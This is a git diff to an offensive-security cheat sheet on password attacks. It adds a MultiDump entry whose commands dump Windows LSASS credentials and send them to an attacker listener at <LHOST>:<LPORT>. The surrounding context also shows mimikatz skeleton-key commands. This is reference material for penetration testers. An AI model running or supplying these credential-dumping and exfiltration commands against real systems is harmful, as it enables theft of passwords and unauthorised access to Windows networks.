@@ -18,6 +18,7 @@
 - [LUKS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#LUKS)
 - [Medusa](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Medusa)
 - [mimikatz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#mimikatz)
+- [MultiDump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#MultiDump)
 - [NetExec](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#NetExec)
 - [Patator](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Patator)
 - [PDFCrack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#PDFCrack)
@@ -497,6 +498,18 @@ mimikatz # privilege::debug
 mimikatz # misc::skeleton
 C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
+```
+
+## MultiDump
+
+> https://github.com/Xre0uS/MultiDump
+
+```c
+$ python3 MultiDumpHandler.py -r <LPORT>
+```
+
+```c
+PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
 ```
 
 ## NetExec
